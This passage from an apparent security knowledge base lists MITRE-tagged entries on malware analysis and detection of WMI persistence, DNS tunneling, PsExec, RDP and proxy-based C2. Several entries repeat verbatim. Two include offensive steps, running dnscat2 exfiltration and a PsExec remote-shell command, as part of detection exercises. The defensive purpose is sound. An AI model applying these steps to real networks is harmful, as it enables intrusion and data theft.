- **Attack Steps**: 1. Launch WMI Explorer and inspect __EventFilter, __EventConsumer. 2. Identify abnormal filters that trigger on system boot or idle. 3. Correlate them with suspicious consumers (script or command lines). 4. Extract script/payload from WMI repository. 5. Analyze script for download behavior or command execution. 6. Check modification timestamps for attacker entry time. 7. Use Autoruns to confirm persistence. 8. Delete malicious WMI classes with PowerShell. 9. Write detection rule to alert on WMI persistence abuse.
- **Detection**: WMI filter audit, autorun inspection
- **Solution**: Monitor and block unauthorized WMI activity
- **Tags**: wmi, persistence, autoruns, payload

## Analyzing Embedded Payloads in Malicious Documents

- **Attack Type**: Document Malware
- **Target**: Office Systems
- **Vulnerability**: Embedded Macros
- **MITRE**: T1203
- **Impact**: Initial Access, Remote Access
- **Tools**: oledump.py, olevba, OfficeMalScanner
- **Scenario**: Attackers embed scripts/macros or hidden objects in Office documents.
- **Attack Steps**: 1. Receive suspicious Office file from IR team.2. Use oledump.py to check for embedded OLE streams and macros.3. If macros exist, extract and decode using olevba.4. Analyze VBA content for suspicious patterns (e.g., AutoOpen, Shell commands).5. Deobfuscate encoded strings using regex or decoding tools.6. Follow potential download links or dropped binaries.7. Validate whether payload connects to C2 or downloads second-stage malware.8. Use YARA rules to identify common document exploits.9. Submit the document to a sandbox for behavioral analysis.10. Document findings and trace infection chain.
- **Detection**: Static/Behavioral Analysis, Macro Detection
- **Solution**: Disable Macros by GPO, Educate users, Use Office Hardening policies
- **Tags**: document-macro, vba, oledump, malware-analysis

## Unpacking Multi-Stage Payloads

- **Attack Type**: Staged Malware
- **Target**: Windows Executables
- **Vulnerability**: Binary Packing
- **MITRE**: T1027
- **Impact**: Payload Evasion, Delayed Execution
- **Tools**: UPX, x64dbg, PEStudio, CyberChef
- **Scenario**: Malware uses a packer to encrypt payloads, launching multiple stages.
- **Attack Steps**: 1. Acquire suspicious binary from infected endpoint.2. Scan with PEStudio to detect anomalies like obfuscation, missing imports.3. Attempt to unpack with UPX or other known packer identifiers.4. If packing is custom, debug using x64dbg to trace entry point and unpacking loop.5. Set breakpoints after memory decryption routines.6. Dump unpacked memory content to disk.7. Use die (Detect It Easy) to identify new file signature.8. Analyze unpacked binary: check IAT, imports, strings, behavior.9. Correlate stages: dropper → downloader → payload.10. Report unpacked payloads to AV vendors or CTI platforms.
- **Detection**: Packer Detection, Runtime Debugging
- **Solution**: Enable Binary Logging, Detect Packing with YARA/Heuristics
- **Tags**: malware-unpacking, reverse-engineering, multi-stage

## Memory-Based Malware String Extraction

- **Attack Type**: Fileless Malware
- **Target**: RAM
- **Vulnerability**: Fileless Injection
- **MITRE**: T1055
- **Impact**: In-memory Persistence
- **Tools**: Volatility, Strings, Ghidra
- **Scenario**: Threat actors inject payload directly into memory, avoiding disk.
- **Attack Steps**: 1. Get memory dump from compromised system.2. Load it into Volatility and list active processes using pslist.3. Identify suspicious or orphaned processes.4. Use strings on process memory to extract readable content.5. Search for indicators like URLs, IPs, registry changes, or encoded data.6. Use Volatility’s yarascan plugin to apply custom YARA rules to memory regions.7. Cross-reference string findings with open threat intel feeds.8. Import extracted payload into Ghidra for disassembly.9. Look for function pointers, dynamic API resolution, or shellcode.10. Document and isolate string-based IOCs.
- **Detection**: YARA + Memory Strings + Process Map
- **Solution**: Detect anomalies in command-line or process memory
- **Tags**: volatility, yara, fileless, in-memory

## Carving and Reconstructing Executables from Memory

- **Attack Type**: In-Memory Binary Recovery
- **Target**: Memory Image
- **Vulnerability**: Process Injection
- **MITRE**: T1055.002
- **Impact**: Undetectable by AV
- **Tools**: Volatility, PE-Sieve, Rekall
- **Scenario**: Malware lives in memory and was never written to disk.
- **Attack Steps**: 1. Load memory dump into Volatility.2. Use malfind to locate injected or hidden code regions.3. Use procdump or memdump to extract process memory.4. Run PE-Sieve against the memory dump to find PE headers and reconstruct binaries.5. Validate executable structure using PE-bear or PEStudio.6. Rebuild Import Address Table (IAT) if corrupted.7. If PE-Sieve fails, try binwalk or manual carving with hex editors.8. Reconstruct file and test behavior in an isolated VM.9. Match MD5/SHA256 against known malware hashes.10. Report as custom fileless malware variant.
- **Detection**: Memory Carving, PE Parsing
- **Solution**: Monitor abnormal memory maps
- **Tags**: in-memory-malware, volatility, process-dump

## Payload with DNS Tunneling Exfiltration

- **Attack Type**: DNS-Based Payload
- **Target**: Network + Host
- **Vulnerability**: DNS Misuse
- **MITRE**: T1071.004
- **Impact**: C2 Exfiltration via DNS
- **Tools**: Wireshark, dnscat2, Sysmon, YARA
- **Scenario**: Malware communicates with C2 via DNS queries.
- **Attack Steps**: 1. Capture PCAP or inspect endpoint logs with DNS activity.2. Use Wireshark to filter queries with large or odd-length subdomains.3. Detect consistent patterns of DNS TXT or A record usage.4. Use dnscat2 or similar decoder to reconstruct payload or commands.5. Identify encoded payload embedded within base64-like DNS traffic.6. Match suspicious domains to malware signatures using YARA.7. Decode extracted payload using CyberChef.8. Confirm system initiated outbound queries; check Sysmon logs.9. Document payload delivery via DNS and its purpose.10. Block malicious DNS domains and isolate host.
- **Detection**: DNS Filtering + YARA on Traffic
- **Solution**: DNS Sinkhole, Block C2 domains
- **Tags**: dns-tunnel, payload-exfil, dnscat2

## PDF File Malware Payload Extraction

- **Attack Type**: PDF Exploit Delivery
- **Target**: PDF Files
- **Vulnerability**: Embedded JS / CVE
- **MITRE**: T1203
- **Impact**: Client Exploitation
- **Tools**: pdfid.py, pdf-parser.py, JSDetox
- **Scenario**: PDF with embedded JavaScript or exploits targeting readers.
- **Attack Steps**: 1. Receive malicious PDF sample from phishing incident.2. Scan with pdfid.py to detect suspicious objects or JS.3. Parse PDF using pdf-parser.py to extract embedded scripts.4. If script is obfuscated, deobfuscate using JSDetox or manually.5. Identify any shellcode or payload download mechanisms.6. Decode encoded sections using base64 or XOR methods.7. Dump any embedded files or binaries from the PDF.8. Analyze dropped files for further compromise.9. Search for exploit CVE usage like CVE-2013-3346 or similar.10. Archive and report all extracted artifacts.
- **Detection**: Static + Dynamic PDF Analysis
- **Solution**: Restrict script execution, PDF Hardening
- **Tags**: pdf-malware, phishing-pdf, embedded-js

## Payload Hiding in Alternate Data Streams (ADS)

- **Attack Type**: ADS Hiding
- **Target**: NTFS Volumes
- **Vulnerability**: ADS Abuse
- **MITRE**: T1564.004
- **Impact**: Hidden Payload Execution
- **Tools**: Streams.exe, ADS Scanner, FTK Imager
- **Scenario**: Windows NTFS used to store hidden payloads.
- **Attack Steps**: 1. Inspect file system with tools like FTK Imager or streams.exe.2. Locate files with :Zone.Identifier or other ADS structures.3. Use ADS Scanner to enumerate and dump hidden content.4. Cross-check filenames like file.txt:hidden.exe.5. Extract payload and validate with hash or sandbox execution.6. Apply YARA rules against hidden streams.7. Compare timestamps of ADS and parent files.8. If payload is executed via command line, correlate with Event Logs.9. Block future use of ADS through GPO or file integrity checks.10. Document artifacts in case report.
- **Detection**: NTFS Metadata Scanning
- **Solution**: ADS Monitoring Tools
- **Tags**: alternate-data-stream, ntfs, payload-hiding

## Extracting Payload from Malicious Browser Extensions

- **Attack Type**: Extension Malware
- **Target**: Browsers
- **Vulnerability**: Extension Abuse
- **MITRE**: T1176
- **Impact**: Credential Theft, C2
- **Tools**: CRX Viewer, Extension Source Viewer
- **Scenario**: Malicious Chrome/Firefox extensions drop payloads.
- **Attack Steps**: 1. Retrieve CRX extension files from user profile folder.2. Unpack CRX using CRX Viewer or zip tools.3. Inspect manifest.json for suspicious permissions (tabs, storage, downloads).4. Locate background.js or content scripts with encoded payloads.5. Decode JavaScript content using CyberChef or manual decoding.6. Look for beaconing, keylogging, download links in script.7. Cross-reference against known IoCs or hash databases.8. Monitor browser behavior (new tabs, data exfil).9. Document extension name, author, permissions, and malicious logic.10. Remove extension and block installation policy-wide.
- **Detection**: Extension Code Review, JS Analysis
- **Solution**: Extension Whitelisting, User Training
- **Tags**: chrome-extension, browser-payload

## Encrypted Payload Delivery via Email Attachments

- **Attack Type**: Encrypted Zip Malware
- **Target**: Email Systems
- **Vulnerability**: Password ZIP Abuse
- **MITRE**: T1203
- **Impact**: Evasion via Encryption
- **Tools**: 7-Zip, Unzip Tools, Email Header Analyzers
- **Scenario**: Attackers deliver password-protected payloads via ZIPs.
- **Attack Steps**: 1. Retrieve suspicious email with password-protected ZIP.2. Extract using known password (often in body text or phishing lure).3. Analyze extracted file: check file type, entropy, digital signature.4. Use PEStudio to assess if binary is suspicious.5. Run in sandbox to understand execution pattern.6. Check if the file drops further payload or modifies system settings.7. Cross-match file hash with threat intel databases.8. Look for lateral movement or persistence creation post-execution.9. Document indicators and ZIP password for future blocking.10. Update mail gateway rules to filter similar attachments.
- **Detection**: File Type + Entropy Analysis
- **Solution**: Filter Encrypted Attachments
- **Tags**: encrypted-zip, email-payload, phishing

## Hybrid Payload Analysis with Static + Dynamic Tools

- **Attack Type**: Comprehensive Analysis
- **Target**: Mixed
- **Vulnerability**: General Malware
- **MITRE**: T1059
- **Impact**: Full Behavioral Detection
- **Tools**: PEStudio, Any.Run, Cuckoo Sandbox, YARA
- **Scenario**: Combine multiple techniques to understand payload in depth.
- **Attack Steps**: 1. Receive suspicious payload from IR team or user alert.2. Perform static inspection with PEStudio: look for anomalies, import functions, sections.3. Use YARA rules to detect known malware traits.4. Submit file to Any.Run or Cuckoo Sandbox for behavioral analysis.5. Monitor file operations, network traffic, registry changes.6. Observe mutex creation, self-deletion behavior, or scheduled tasks.7. Export full execution timeline.8. Combine static + dynamic results to attribute malware family.9. Create detection rules based on combined indicators.10. Share findings internally and with threat intel platforms.
- **Detection**: Static + Dynamic Correlation
- **Solution**: Integrate Tools + IOC Sharing
- **Tags**: hybrid-analysis, cuckoo, yara

## Detecting C2 Communication via Zeek

- **Attack Type**: Packet Analysis
- **Target**: Enterprise Network
- **Vulnerability**: DNS Tunneling
- **MITRE**: T1071.004
- **Impact**: Data exfiltration and persistent control
- **Tools**: Zeek, Wireshark, DNS logs
- **Scenario**: A C2 server is communicating with an internal system using DNS tunneling
- **Attack Steps**: 1. Deploy Zeek on a network tap or span port to passively monitor internal traffic. 2. Configure Zeek to log DNS queries (dns.log). 3. Identify unusually frequent DNS queries with similar subdomains or patterns (e.g., encoded strings). 4. Use Wireshark to capture and analyze DNS query payloads. 5. Cross-reference domains with threat intelligence. 6. Confirm presence of encoded C2 commands in DNS data fields. 7. Extract indicators (IP, domains, payloads) for deeper analysis.
- **Detection**: Anomalous DNS request patterns
- **Solution**: Block malicious domains and tighten DNS egress rules
- **Tags**: DNS, Zeek, Threat Intel, Beaconing

## Tracing SMB Lateral Movement with Zeek

- **Attack Type**: Lateral Movement
- **Target**: Internal Hosts
- **Vulnerability**: Poor internal segmentation
- **MITRE**: T1021.002
- **Impact**: Malware spreading internally
- **Tools**: Zeek, SMB logs, Event Viewer
- **Scenario**: Attacker uses SMB to propagate malware across internal systems
- **Attack Steps**: 1. Enable Zeek’s SMB protocol detection module. 2. Monitor smb_files.log, smb_mapping.log, and conn.log for internal SMB sessions. 3. Identify unusual file transfers or executable file access between hosts. 4. Look for signs of admin$ or C$ access indicating remote control. 5. Correlate with Windows event logs (e.g., 4624 logons and 5145 file access). 6. Cross-check MAC addresses and usernames to trace lateral movement path. 7. Alert on excessive SMB communication or access anomalies.
- **Detection**: Log correlation between SMB and authentication logs
- **Solution**: Enforce SMB signing, disable legacy shares, restrict lateral credentials
- **Tags**: SMB, Lateral Movement, Zeek, Host-Host Traffic

## Correlating Proxy Logs for Exfil Detection

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Enterprise Network
- **Vulnerability**: Inadequate outbound traffic control
- **MITRE**: T1041
- **Impact**: Sensitive data exfiltrated outside network
- **Tools**: Squid Proxy, Zeek, Splunk
- **Scenario**: Exfiltration through allowed proxy ports using encrypted C2 channels
- **Attack Steps**: 1. Aggregate HTTP/S proxy logs from enterprise proxy server. 2. Load logs into SIEM (e.g., Splunk) for timeline view. 3. Search for high-volume outbound transfers to unrecognized IPs or domains. 4. Filter by user agent anomalies or rare user agents. 5. Review referrer headers and hostname fields. 6. Use Zeek http.log to inspect matching events. 7. Validate if content was uploaded using POST/PUT. 8. Confirm by checking endpoint for matching file activity or browser history.
- **Detection**: Proxy traffic anomaly detection
- **Solution**: Restrict proxy access, monitor POST requests, implement DLP solutions
- **Tags**: Proxy Logs, C2 Traffic, SIEM, Encrypted Tunnels

## Mapping PsExec Activity Across Subnet

- **Attack Type**: Lateral Movement
- **Target**: Windows Systems
- **Vulnerability**: Admin shares open, weak credentials
- **MITRE**: T1569.002
- **Impact**: Privileged lateral access across network
- **Tools**: Sysmon, Event Logs, KAPE, WinLogBeat
- **Scenario**: Red teamer moves laterally using PsExec from a compromised Windows machine
- **Attack Steps**: 1. Ensure Sysmon logging is enabled across endpoints. 2. Collect logs using WinLogBeat or KAPE. 3. Search for Event ID 1 showing PsExec.exe execution. 4. Trace parent-child process chains (e.g., cmd.exe → PsExec → remote binary). 5. Identify machines targeted via network connection logs. 6. Correlate Event ID 3 (network connection) with timestamps. 7. Detect PsExec service creation and deletion events on remote machines. 8. Build a visual map of PsExec jumps.
- **Detection**: Log analysis of process creation and remote sessions
- **Solution**: Disable admin shares, enforce SMB authentication
- **Tags**: PsExec, Sysmon, Windows Logs, Remote Execution

## Detecting WMI Lateral Execution

- **Attack Type**: Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: WMI unrestricted access
- **MITRE**: T1047
- **Impact**: Stealthy fileless execution on remote hosts
- **Tools**: Sysmon, PowerShell Logs, Event Viewer
- **Scenario**: Attacker uses WMI to execute commands on remote systems without dropping files
- **Attack Steps**: 1. Enable Sysmon Event ID 1 (process creation) and 3 (network connection). 2. Collect PowerShell logs (Module logging + Script Block). 3. Identify wmic or Invoke-WmiMethod executions from unusual sources. 4. Look for remote process creations via WMI (Win32_Process.Create). 5. Cross-check source and target machine logs to confirm linkage. 6. Monitor for NTLM auth failures or relays. 7. Validate access patterns during off hours.
- **Detection**: PowerShell and WMI command monitoring
- **Solution**: Limit WMI access, use remote logging and PowerShell Constrained Language Mode
- **Tags**: WMI, PowerShell, Fileless, Sysmon

## DNS Tunneling Detection with Zeek

- **Attack Type**: Packet Analysis
- **Target**: User Workstation
- **Vulnerability**: Allowed outbound DNS + weak filtering
- **MITRE**: T1071.004
- **Impact**: Persistent external C2 communication
- **Tools**: Zeek, DNS Logs, SecurityOnion
- **Scenario**: Attacker establishes DNS tunneling C2 from infected workstation
- **Attack Steps**: 1. Configure Zeek to monitor DNS traffic in dns.log. 2. Sort by query length and frequency. 3. Identify repeated large TXT records or subdomain patterns. 4. Investigate suspicious domains resolving to public IPs. 5. Use entropy scoring on subdomains to find encoded data. 6. Compare against baseline of normal DNS queries. 7. Alert on long, rapid, or repetitive requests. 8. Correlate client device behavior (file activity, malware alert, etc.).
- **Detection**: Anomaly detection on DNS length and entropy
- **Solution**: Implement egress DNS filtering and apply DoH blacklists
- **Tags**: DNS Tunneling, Zeek, Beaconing, Exfiltration

## RDP Movement Correlation with Firewall Logs

- **Attack Type**: Lateral Movement
- **Target**: Internal Hosts
- **Vulnerability**: Exposed RDP, weak passwords
- **MITRE**: T1021.001
- **Impact**: Compromise of additional hosts
- **Tools**: Firewall Logs, Event Logs, KAPE
- **Scenario**: RDP connections are used by attacker to pivot internally
- **Attack Steps**: 1. Pull Windows Event IDs 4624 and 1149 to detect successful RDP logins. 2. Match with firewall logs indicating RDP (port 3389) access. 3. Extract source and destination IPs. 4. Trace jump paths using timestamp correlation. 5. Identify anomalous login times or users. 6. Cross-reference with logon type (Type 10 = RemoteInteractive). 7. Detect brute-force behavior from multiple failed logins. 8. Enrich with geo-location or device inventory.
- **Detection**: Correlation of RDP logs and firewall entries
- **Solution**: Enforce MFA, disable external RDP, monitor login frequency
- **Tags**: RDP, Firewall, Credential Abuse

## Matching Internal DNS to External C2

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Internal System
- **Vulnerability**: DNS + HTTP/S allowed outbound
- **MITRE**: T1071
- **Impact**: C2 persistence and command reception
- **Tools**: DNS Logs, Zeek, Threat Intelligence
- **Scenario**: An internal host is beaconing to an unknown external C2 infrastructure
- **Attack Steps**: 1. Review internal DNS logs for outbound resolutions. 2. Isolate domains queried by infected system. 3. Check domains against threat feeds. 4. Extract IPs resolved and match with firewall outbound logs. 5. Validate beacon intervals (5s, 60s, 5min). 6. Inspect user agents and HTTP headers if C2 uses HTTP/S. 7. Review timeline of host behavior and artifacts. 8. Confirm system behavior using memory/disk forensics.
- **Detection**: DNS + firewall correlation with known C2 lists
- **Solution**: Isolate beaconing host, reimage, block domains/IPs
- **Tags**: DNS, C2, Beaconing, Proxy Logs

## Tracking Internal Pivot with NetFlow

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: No segmentation or flow monitoring
- **MITRE**: T1021, T1071
- **Impact**: Internal spread of compromise
- **Tools**: NetFlow, SIEM, NMAP
- **Scenario**: A threat actor moves laterally using credentialed access, visible via NetFlow
- **Attack Steps**: 1. Configure NetFlow collectors to ingest from internal routers/switches. 2. Analyze flows showing sequential access between hosts. 3. Identify abnormal port scans or remote executions. 4. Correlate flow spikes with authentication logs. 5. Filter for ports 135, 445, 3389. 6. Investigate for lateral tools (e.g., RDP, SMB, WMI). 7. Enrich with hostname and user mappings. 8. Generate heatmap of internal traffic for anomalies.
- **Detection**: Flow analysis and authentication log cross-correlation
- **Solution**: Microsegmentation and network behavior monitoring
- **Tags**: NetFlow, SIEM, Lateral Movement, Credential Abuse

## Proxy Abuse for Covert Tunneling

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Enterprise Network
- **Vulnerability**: Proxy misuse via user session abuse
- **MITRE**: T1041
- **Impact**: C2 comms through allowed infrastructure
- **Tools**: C2 Tools, Squid Proxy, Wireshark
- **Scenario**: Covert HTTP tunnel built through enterprise proxy server
- **Attack Steps**: 1. Capture proxy logs for abnormal HTTP headers and long POST requests. 2. Monitor suspicious user agents and persistent sessions. 3. Search for constant polling to external domains. 4. Analyze packet size uniformity and timing. 5. Inspect content of payloads via Wireshark or proxy capture. 6. Use threat intel to identify C2 toolkits (e.g., Merlin, Cobalt Strike). 7. Confirm endpoint tool execution (memory dump). 8. Correlate internal alerts (EDR logs) for infection.
- **Detection**: Proxy analysis, packet inspection, EDR correlation
- **Solution**: Apply proxy filtering, inspect HTTP headers, detect toolkits
- **Tags**: Covert Tunnel, Proxy Abuse, HTTP C2

## Detecting C2 Communication via Zeek

- **Attack Type**: Packet Analysis
- **Target**: Enterprise Network
- **Vulnerability**: DNS Tunneling
- **MITRE**: T1071.004
- **Impact**: Data exfiltration and persistent control
- **Tools**: Zeek, Wireshark, DNS logs
- **Scenario**: A C2 server is communicating with an internal system using DNS tunneling
- **Attack Steps**: 1. Deploy Zeek on a network tap or span port to passively monitor internal traffic. 2. Configure Zeek to log DNS queries (dns.log). 3. Identify unusually frequent DNS queries with similar subdomains or patterns (e.g., encoded strings). 4. Use Wireshark to capture and analyze DNS query payloads. 5. Cross-reference domains with threat intelligence. 6. Confirm presence of encoded C2 commands in DNS data fields. 7. Extract indicators (IP, domains, payloads) for deeper analysis.
- **Detection**: Anomalous DNS request patterns
- **Solution**: Block malicious domains and tighten DNS egress rules
- **Tags**: DNS, Zeek, Threat Intel, Beaconing

## Tracing SMB Lateral Movement with Zeek

- **Attack Type**: Lateral Movement
- **Target**: Internal Hosts
- **Vulnerability**: Poor internal segmentation
- **MITRE**: T1021.002
- **Impact**: Malware spreading internally
- **Tools**: Zeek, SMB logs, Event Viewer
- **Scenario**: Attacker uses SMB to propagate malware across internal systems
- **Attack Steps**: 1. Enable Zeek’s SMB protocol detection module. 2. Monitor smb_files.log, smb_mapping.log, and conn.log for internal SMB sessions. 3. Identify unusual file transfers or executable file access between hosts. 4. Look for signs of admin$ or C$ access indicating remote control. 5. Correlate with Windows event logs (e.g., 4624 logons and 5145 file access). 6. Cross-check MAC addresses and usernames to trace lateral movement path. 7. Alert on excessive SMB communication or access anomalies.
- **Detection**: Log correlation between SMB and authentication logs
- **Solution**: Enforce SMB signing, disable legacy shares, restrict lateral credentials
- **Tags**: SMB, Lateral Movement, Zeek, Host-Host Traffic

## Correlating Proxy Logs for Exfil Detection

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Enterprise Network
- **Vulnerability**: Inadequate outbound traffic control
- **MITRE**: T1041
- **Impact**: Sensitive data exfiltrated outside network
- **Tools**: Squid Proxy, Zeek, Splunk
- **Scenario**: Exfiltration through allowed proxy ports using encrypted C2 channels
- **Attack Steps**: 1. Aggregate HTTP/S proxy logs from enterprise proxy server. 2. Load logs into SIEM (e.g., Splunk) for timeline view. 3. Search for high-volume outbound transfers to unrecognized IPs or domains. 4. Filter by user agent anomalies or rare user agents. 5. Review referrer headers and hostname fields. 6. Use Zeek http.log to inspect matching events. 7. Validate if content was uploaded using POST/PUT. 8. Confirm by checking endpoint for matching file activity or browser history.
- **Detection**: Proxy traffic anomaly detection
- **Solution**: Restrict proxy access, monitor POST requests, implement DLP solutions
- **Tags**: Proxy Logs, C2 Traffic, SIEM, Encrypted Tunnels

## Mapping PsExec Activity Across Subnet

- **Attack Type**: Lateral Movement
- **Target**: Windows Systems
- **Vulnerability**: Admin shares open, weak credentials
- **MITRE**: T1569.002
- **Impact**: Privileged lateral access across network
- **Tools**: Sysmon, Event Logs, KAPE, WinLogBeat
- **Scenario**: Red teamer moves laterally using PsExec from a compromised Windows machine
- **Attack Steps**: 1. Ensure Sysmon logging is enabled across endpoints. 2. Collect logs using WinLogBeat or KAPE. 3. Search for Event ID 1 showing PsExec.exe execution. 4. Trace parent-child process chains (e.g., cmd.exe → PsExec → remote binary). 5. Identify machines targeted via network connection logs. 6. Correlate Event ID 3 (network connection) with timestamps. 7. Detect PsExec service creation and deletion events on remote machines. 8. Build a visual map of PsExec jumps.
- **Detection**: Log analysis of process creation and remote sessions
- **Solution**: Disable admin shares, enforce SMB authentication
- **Tags**: PsExec, Sysmon, Windows Logs, Remote Execution

## Detecting WMI Lateral Execution

- **Attack Type**: Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: WMI unrestricted access
- **MITRE**: T1047
- **Impact**: Stealthy fileless execution on remote hosts
- **Tools**: Sysmon, PowerShell Logs, Event Viewer
- **Scenario**: Attacker uses WMI to execute commands on remote systems without dropping files
- **Attack Steps**: 1. Enable Sysmon Event ID 1 (process creation) and 3 (network connection). 2. Collect PowerShell logs (Module logging + Script Block). 3. Identify wmic or Invoke-WmiMethod executions from unusual sources. 4. Look for remote process creations via WMI (Win32_Process.Create). 5. Cross-check source and target machine logs to confirm linkage. 6. Monitor for NTLM auth failures or relays. 7. Validate access patterns during off hours.
- **Detection**: PowerShell and WMI command monitoring
- **Solution**: Limit WMI access, use remote logging and PowerShell Constrained Language Mode
- **Tags**: WMI, PowerShell, Fileless, Sysmon

## DNS Tunneling Detection with Zeek

- **Attack Type**: Packet Analysis
- **Target**: User Workstation
- **Vulnerability**: Allowed outbound DNS + weak filtering
- **MITRE**: T1071.004
- **Impact**: Persistent external C2 communication
- **Tools**: Zeek, DNS Logs, SecurityOnion
- **Scenario**: Attacker establishes DNS tunneling C2 from infected workstation
- **Attack Steps**: 1. Configure Zeek to monitor DNS traffic in dns.log. 2. Sort by query length and frequency. 3. Identify repeated large TXT records or subdomain patterns. 4. Investigate suspicious domains resolving to public IPs. 5. Use entropy scoring on subdomains to find encoded data. 6. Compare against baseline of normal DNS queries. 7. Alert on long, rapid, or repetitive requests. 8. Correlate client device behavior (file activity, malware alert, etc.).
- **Detection**: Anomaly detection on DNS length and entropy
- **Solution**: Implement egress DNS filtering and apply DoH blacklists
- **Tags**: DNS Tunneling, Zeek, Beaconing, Exfiltration

## RDP Movement Correlation with Firewall Logs

- **Attack Type**: Lateral Movement
- **Target**: Internal Hosts
- **Vulnerability**: Exposed RDP, weak passwords
- **MITRE**: T1021.001
- **Impact**: Compromise of additional hosts
- **Tools**: Firewall Logs, Event Logs, KAPE
- **Scenario**: RDP connections are used by attacker to pivot internally
- **Attack Steps**: 1. Pull Windows Event IDs 4624 and 1149 to detect successful RDP logins. 2. Match with firewall logs indicating RDP (port 3389) access. 3. Extract source and destination IPs. 4. Trace jump paths using timestamp correlation. 5. Identify anomalous login times or users. 6. Cross-reference with logon type (Type 10 = RemoteInteractive). 7. Detect brute-force behavior from multiple failed logins. 8. Enrich with geo-location or device inventory.
- **Detection**: Correlation of RDP logs and firewall entries
- **Solution**: Enforce MFA, disable external RDP, monitor login frequency
- **Tags**: RDP, Firewall, Credential Abuse

## Matching Internal DNS to External C2

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Internal System
- **Vulnerability**: DNS + HTTP/S allowed outbound
- **MITRE**: T1071
- **Impact**: C2 persistence and command reception
- **Tools**: DNS Logs, Zeek, Threat Intelligence
- **Scenario**: An internal host is beaconing to an unknown external C2 infrastructure
- **Attack Steps**: 1. Review internal DNS logs for outbound resolutions. 2. Isolate domains queried by infected system. 3. Check domains against threat feeds. 4. Extract IPs resolved and match with firewall outbound logs. 5. Validate beacon intervals (5s, 60s, 5min). 6. Inspect user agents and HTTP headers if C2 uses HTTP/S. 7. Review timeline of host behavior and artifacts. 8. Confirm system behavior using memory/disk forensics.
- **Detection**: DNS + firewall correlation with known C2 lists
- **Solution**: Isolate beaconing host, reimage, block domains/IPs
- **Tags**: DNS, C2, Beaconing, Proxy Logs

## Tracking Internal Pivot with NetFlow

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: No segmentation or flow monitoring
- **MITRE**: T1021, T1071
- **Impact**: Internal spread of compromise
- **Tools**: NetFlow, SIEM, NMAP
- **Scenario**: A threat actor moves laterally using credentialed access, visible via NetFlow
- **Attack Steps**: 1. Configure NetFlow collectors to ingest from internal routers/switches. 2. Analyze flows showing sequential access between hosts. 3. Identify abnormal port scans or remote executions. 4. Correlate flow spikes with authentication logs. 5. Filter for ports 135, 445, 3389. 6. Investigate for lateral tools (e.g., RDP, SMB, WMI). 7. Enrich with hostname and user mappings. 8. Generate heatmap of internal traffic for anomalies.
- **Detection**: Flow analysis and authentication log cross-correlation
- **Solution**: Microsegmentation and network behavior monitoring
- **Tags**: NetFlow, SIEM, Lateral Movement, Credential Abuse

## Proxy Abuse for Covert Tunneling

- **Attack Type**: Firewall/Proxy Correlation
- **Target**: Enterprise Network
- **Vulnerability**: Proxy misuse via user session abuse
- **MITRE**: T1041
- **Impact**: C2 comms through allowed infrastructure
- **Tools**: C2 Tools, Squid Proxy, Wireshark
- **Scenario**: Covert HTTP tunnel built through enterprise proxy server
- **Attack Steps**: 1. Capture proxy logs for abnormal HTTP headers and long POST requests. 2. Monitor suspicious user agents and persistent sessions. 3. Search for constant polling to external domains. 4. Analyze packet size uniformity and timing. 5. Inspect content of payloads via Wireshark or proxy capture. 6. Use threat intel to identify C2 toolkits (e.g., Merlin, Cobalt Strike). 7. Confirm endpoint tool execution (memory dump). 8. Correlate internal alerts (EDR logs) for infection.
- **Detection**: Proxy analysis, packet inspection, EDR correlation
- **Solution**: Apply proxy filtering, inspect HTTP headers, detect toolkits
- **Tags**: Covert Tunnel, Proxy Abuse, HTTP C2

## Detecting Exfiltration via DNS Tunneling using Zeek

- **Attack Type**: DNS Tunneling
- **Target**: Enterprise LAN
- **Vulnerability**: Open egress on DNS port to untrusted domains
- **MITRE**: T1048.003
- **Impact**: Data exfiltration without triggering traditional alerts
- **Tools**: Zeek, tshark, dnscat2
- **Scenario**: An attacker uses DNS tunneling to exfiltrate stolen data by encoding it in DNS queries to a rogue server
- **Attack Steps**: 1. Set up a Zeek sensor on the network to capture DNS traffic. 2. Start a DNS exfiltration tool like dnscat2 on the attacker side. 3. Encode files or commands into DNS query packets (e.g., base64 into subdomain). 4. Zeek will log unusual query lengths, patterns, and frequency in dns.log. 5. Use Zeek scripts or zeek-cut to analyze domain entropy, frequency, and data volume. 6. Correlate suspected queries with internal hosts and session times. 7. Use threat intel feeds to check suspicious domains. 8. Export full PCAPs for deeper inspection using Wireshark.
- **Detection**: DNS entropy analysis, Zeek scripting, anomaly detection
- **Solution**: Block unauthorized DNS traffic, use internal DNS resolvers, inspect DNS payloads
- **Tags**: DNS, exfiltration, Zeek, anomaly detection

## Mapping PsExec-Based Lateral Movement with Firewall Logs

- **Attack Type**: Lateral Movement via SMB
- **Target**: Windows Hosts
- **Vulnerability**: Over-permissive admin share access and SMB exposure
- **MITRE**: T1021.002
- **Impact**: Compromise of additional internal systems
- **Tools**: Windows Firewall Logs, KAPE, Splunk
- **Scenario**: Attacker uses PsExec to move laterally using administrative shares across hosts
- **Attack Steps**: 1. Simulate PsExec movement by running PsExec.exe \\target cmd.exe from attacker host. 2. Enable firewall logging on target systems (netsh advfirewall). 3. Extract logs with KAPE or manually pull from %systemroot%\system32\LogFiles\Firewall. 4. Parse logs for connection attempts on TCP port 445 (SMB) from source host. 5. Cross-reference time and source IP with login attempts in security logs. 6. Use timeline tools to build a sequence of lateral movement. 7. Look for patterns across multiple endpoints indicating propagation behavior.
- **Detection**: SMB connection tracking, Windows event correlation
- **Solution**: Harden admin shares, restrict SMB, use PsExec detection signatures
- **Tags**: PsExec, SMB, Windows Firewall Logs, lateral movement

## Beaconing Detection via Zeek’s Conn and Notice Logs

- **Attack Type**: C2 Beaconing
- **Target**: Enterprise LAN
- **Vulnerability**: Firewall allows outbound to unmonitored remote IPs
- **MITRE**: T1071.001
- **Impact**: Establishment of persistent remote access channels
- **Tools**: Zeek, ELK Stack, RITA
- **Scenario**: Attacker implants malware that connects to a C2 server at regular intervals
